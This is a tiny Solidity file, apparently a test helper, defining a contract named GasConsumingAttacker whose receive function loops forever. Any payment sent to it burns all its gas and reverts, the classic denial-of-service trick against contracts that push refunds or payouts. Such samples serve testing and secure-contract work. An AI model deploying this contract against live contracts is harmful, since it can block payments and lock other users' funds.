pragma solidity ^0.8.0;

contract GasConsumingAttacker {
    receive() external payable {
        uint i = 0;
        while (true) {
            i++;
        }
    }
}